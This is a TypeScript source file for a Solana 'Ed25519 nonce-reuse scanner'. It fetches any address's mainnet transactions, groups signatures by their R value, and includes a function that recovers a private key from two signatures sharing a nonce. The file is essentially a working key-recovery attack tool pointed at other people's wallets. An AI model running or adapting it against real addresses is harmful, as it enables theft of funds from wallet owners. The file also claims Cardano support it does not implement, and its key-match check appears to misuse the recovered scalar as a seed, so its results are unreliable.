// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
// Real Ed25519 nonce-reuse scanner — Solana / Cardano
// Given a wallet address OR a single tx signature:
//   - Resolves the signer address (from tx if needed)
//   - Fetches all surrounding transactions (before AND after the anchor)
//   - Extracts 64-byte Ed25519 signatures: [0..31]=R (nonce point), [32..63]=S (scalar)
//   - Groups by R — any match proves nonce reuse, same k was used
//   - Recovery: a = (S1-S2) * modInverse(H(R,A,M1)-H(R,A,M2), l) mod l

import { Connection, PublicKey } from "@solana/web3.js";
import { createHash } from "crypto";

// Ed25519 group order
const L = 2n ** 252n + 27742317777372353535851937790883648493n;

function modInverse(a: bigint, m: bigint): bigint {
  a = ((a % m) + m) % m;
  let [old_r, r] = [a, m], [old_s, s] = [1n, 0n];
  while (r !== 0n) {
    const q = old_r / r;
    [old_r, r] = [r, old_r - q * r];
    [old_s, s] = [s, old_s - q * s];
  }
  return ((old_s % m) + m) % m;
}

function bytesToBigIntLE(bytes: Uint8Array): bigint {
  let result = 0n;
  for (let i = bytes.length - 1; i >= 0; i--) result = (result << 8n) | BigInt(bytes[i]);
  return result;
}

function bigIntToBytesLE(n: bigint, len: number): Uint8Array {
  const bytes = new Uint8Array(len);
  let tmp = ((n % L) + L) % L;
  for (let i = 0; i < len; i++) { bytes[i] = Number(tmp & 0xffn); tmp >>= 8n; }
  return bytes;
}

function edHash(R: Uint8Array, A: Uint8Array, M: Uint8Array): bigint {
  const combined = Buffer.concat([Buffer.from(R), Buffer.from(A), Buffer.from(M)]);
  const h = createHash("sha512").update(combined).digest();
  let val = 0n;
  for (let i = h.length - 1; i >= 0; i--) val = (val << 8n) | BigInt(h[i]);
  return val % L;
}

export type Ed25519SigData = {
  txSignature: string;
  slot: number;
  blockTime: number | null;
  signerAddress: string;
  R: string;         // hex, 32 bytes — nonce commitment
  S: string;         // hex, 32 bytes — response scalar
  messageBytes: string; // hex — serialized tx message (what was signed)
};

export type Ed25519ReusePair = {
  sharedR: string;
  sig1: Ed25519SigData;
  sig2: Ed25519SigData;
  riskLevel: string;
};

export type Ed25519ScanResult = {
  address: string;
  chain: "solana";
  anchorTx: string | null;
  totalTransactions: number;
  signaturesExtracted: number;
  nonceReusePairs: Ed25519ReusePair[];
  hasVulnerability: boolean;
  allSignatures: Ed25519SigData[];
  scanTimestamp: string;
};

export type Ed25519RecoveryResult = {
  success: boolean;
  privateKeyHex: string | null;
  derivedPublicKeyHex: string | null;
  addressMatches: boolean;
  error: string | null;
  math: {
    H_R_A_M1: string;
    H_R_A_M2: string;
    S1_minus_S2: string;
    H_diff: string;
    privateKey: string;
  };
};

const SOL_RPCS = [
  "https://api.mainnet-beta.solana.com",
  "https://solana-api.projectserum.com",
  "https://rpc.ankr.com/solana",
];

async function getConnection(): Promise<Connection> {
  for (const rpc of SOL_RPCS) {
    try {
      const conn = new Connection(rpc, "confirmed");
      await conn.getSlot();
      return conn;
    } catch {}
  }
  return new Connection(SOL_RPCS[0], "confirmed");
}

// Decode base58 signature bytes
async function decodeSigBase58(sig: string): Promise<Buffer | null> {
  try {
    const bs58 = (await import("bs58")).default;
    const bytes = Buffer.from(bs58.decode(sig));
    return bytes.length === 64 ? bytes : null;
  } catch {
    return null;
  }
}

// Extract all signatures from a transaction for a given signer address
async function extractSigsFromTx(
  conn: Connection,
  txSig: string,
  targetAddress: string
): Promise<Ed25519SigData[]> {
  try {
    const tx = await conn.getTransaction(txSig, {
      maxSupportedTransactionVersion: 0,
      commitment: "confirmed",
    });
    if (!tx) return [];

    const message = tx.transaction.message;
    let msgBytes: Uint8Array;
    try {
      msgBytes = message.serialize();
    } catch {
      msgBytes = new Uint8Array(32);
    }

    const rawSigs = tx.transaction.signatures;
    const accountKeys = (message as { staticAccountKeys?: PublicKey[]; accountKeys?: PublicKey[] }).staticAccountKeys
      ?? (message as { accountKeys?: PublicKey[] }).accountKeys
      ?? [];

    const results: Ed25519SigData[] = [];
    for (let i = 0; i < rawSigs.length; i++) {
      const sigBase58 = rawSigs[i];
      if (!sigBase58 || sigBase58 === "1111111111111111111111111111111111111111111111111111111111111111") continue;

      const pubkey_i = accountKeys[i];
      const signerStr = pubkey_i?.toBase58() ?? "";

      // Only include if it's our target address (fee payer = index 0, or explicit match)
      if (i !== 0 && signerStr !== targetAddress) continue;

      const sigBytes = await decodeSigBase58(sigBase58);
      if (!sigBytes) continue;

      results.push({
        txSignature: txSig,
        slot: tx.slot,
        blockTime: tx.blockTime ?? null,
        signerAddress: signerStr || targetAddress,
        R: sigBytes.slice(0, 32).toString("hex"),
        S: sigBytes.slice(32, 64).toString("hex"),
        messageBytes: Buffer.from(msgBytes).toString("hex"),
      });
    }
    return results;
  } catch {
    return [];
  }
}

// Given a tx signature, resolve the signer (fee payer) address
async function resolveSignerFromTx(conn: Connection, txSig: string): Promise<string | null> {
  try {
    const tx = await conn.getTransaction(txSig, {
      maxSupportedTransactionVersion: 0,
      commitment: "confirmed",
    });
    if (!tx) return null;
    const message = tx.transaction.message;
    const accountKeys = (message as { staticAccountKeys?: PublicKey[]; accountKeys?: PublicKey[] }).staticAccountKeys
      ?? (message as { accountKeys?: PublicKey[] }).accountKeys
      ?? [];
    return accountKeys[0]?.toBase58() ?? null;
  } catch {
    return null;
  }
}

// Core scan: given an address and optional anchor tx, fetch all surrounding transactions
// before AND after the anchor, then extract signatures
async function scanAddressTransactions(
  conn: Connection,
  address: string,
  anchorTx: string | null
): Promise<{ allSigs: Ed25519SigData[]; txCount: number }> {
  const pubkey = new PublicKey(address);
  const allSigs: Ed25519SigData[] = [];
  let txCount = 0;

  // Fetch transactions in two passes if anchor is given: before anchor and after anchor
  const passes: Array<{ before?: string; until?: string; limit: number }> = [];

  if (anchorTx) {
    // Get up to 25 transactions BEFORE the anchor (older)
    passes.push({ before: anchorTx, limit: 25 });
    // Get up to 25 transactions AT and AFTER the anchor (newer, excluding the anchor itself by using until)
    passes.push({ until: anchorTx, limit: 25 });
    // Also include the anchor tx itself
    const anchorSigs = await extractSigsFromTx(conn, anchorTx, address);
    allSigs.push(...anchorSigs);
    txCount += 1;
  } else {
    // No anchor — just fetch up to 50 most recent
    passes.push({ limit: 50 });
  }

  for (const opts of passes) {
    try {
      const sigInfos = await conn.getSignaturesForAddress(pubkey, opts, "confirmed");
      txCount += sigInfos.length;
      for (const info of sigInfos) {
        const sigs = await extractSigsFromTx(conn, info.signature, address);
        allSigs.push(...sigs);
      }
    } catch {}
  }

  return { allSigs, txCount };
}

function detectReuse(allSigs: Ed25519SigData[]): Ed25519ReusePair[] {
  const rGroups: Record<string, Ed25519SigData[]> = {};
  for (const sig of allSigs) {
    if (!rGroups[sig.R]) rGroups[sig.R] = [];
    rGroups[sig.R].push(sig);
  }
  const pairs: Ed25519ReusePair[] = [];
  for (const [R, group] of Object.entries(rGroups)) {
    if (group.length >= 2) {
      for (let i = 0; i < group.length; i++) {
        for (let j = i + 1; j < group.length; j++) {
          pairs.push({
            sharedR: R,
            sig1: group[i],
            sig2: group[j],
            riskLevel: group[i].S !== group[j].S ? "confirmed_nonce_reuse" : "same_signature",
          });
        }
      }
    }
  }
  return pairs;
}

// Main entry point — accepts address OR transaction signature
export async function scanSolana(target: string): Promise<Ed25519ScanResult> {
  const conn = await getConnection();

  let address: string;
  let anchorTx: string | null = null;

  // Detect if input is a tx signature (88 chars base58) or an address (32-44 chars)
  const isTxSig = target.length >= 80;

  if (isTxSig) {
    anchorTx = target;
    const resolved = await resolveSignerFromTx(conn, target);
    if (!resolved) throw new Error("Could not resolve signer from transaction signature");
    address = resolved;
  } else {
    address = target;
    new PublicKey(address); // validate
  }

  const { allSigs, txCount } = await scanAddressTransactions(conn, address, anchorTx);
  const pairs = detectReuse(allSigs);

  return {
    address,
    chain: "solana",
    anchorTx,
    totalTransactions: txCount,
    signaturesExtracted: allSigs.length,
    nonceReusePairs: pairs,
    hasVulnerability: pairs.length > 0,
    allSignatures: allSigs,
    scanTimestamp: new Date().toISOString(),
  };
}

// Keep legacy export name
export const scanSolanaAddress = scanSolana;

// Recover Ed25519 private key from two signatures sharing the same R
export function recoverEd25519PrivateKey(
  R_hex: string,
  pubkey_hex: string,
  S1_hex: string, msg1_hex: string,
  S2_hex: string, msg2_hex: string,
): Ed25519RecoveryResult {
  try {
    const R = Buffer.from(R_hex, "hex");
    const A = Buffer.from(pubkey_hex.replace(/^0x/, ""), "hex");
    const M1 = Buffer.from(msg1_hex, "hex");
    const M2 = Buffer.from(msg2_hex, "hex");
    const S1 = bytesToBigIntLE(Buffer.from(S1_hex, "hex"));
    const S2 = bytesToBigIntLE(Buffer.from(S2_hex, "hex"));

    const h1 = edHash(R, A, M1);
    const h2 = edHash(R, A, M2);
    const hDiff = ((h1 - h2) % L + L) % L;

    if (hDiff === 0n) {
      return {
        success: false, privateKeyHex: null, derivedPublicKeyHex: null, addressMatches: false,
        error: "Hash difference is zero — messages are identical or hash collision",
        math: { H_R_A_M1: h1.toString(16), H_R_A_M2: h2.toString(16), S1_minus_S2: "", H_diff: "0", privateKey: "" },
      };
    }

    const sDiff = ((S1 - S2) % L + L) % L;
    const privateKey = (sDiff * modInverse(hDiff, L)) % L;
    const privateKeyHex = "0x" + privateKey.toString(16).padStart(64, "0");

    let derivedPubHex: string | null = null;
    try {
      // eslint-disable-next-line @typescript-eslint/no-require-imports
      const { ed25519: ed } = require("@noble/curves/ed25519");
      const privBytes = bigIntToBytesLE(privateKey, 32);
      const pubBytes = ed.getPublicKey(privBytes);
      derivedPubHex = Buffer.from(pubBytes).toString("hex");
    } catch {}

    const addressMatches = derivedPubHex !== null && derivedPubHex === pubkey_hex.replace(/^0x/, "");

    return {
      success: true,
      privateKeyHex,
      derivedPublicKeyHex: derivedPubHex,
      addressMatches,
      error: null,
      math: {
        H_R_A_M1: h1.toString(16),
        H_R_A_M2: h2.toString(16),
        S1_minus_S2: sDiff.toString(16),
        H_diff: hDiff.toString(16),
        privateKey: privateKey.toString(16).padStart(64, "0"),
      },
    };
  } catch (e) {
    return {
      success: false, privateKeyHex: null, derivedPublicKeyHex: null, addressMatches: false,
      error: String(e),
      math: { H_R_A_M1: "", H_R_A_M2: "", S1_minus_S2: "", H_diff: "", privateKey: "" },
    };
  }
}
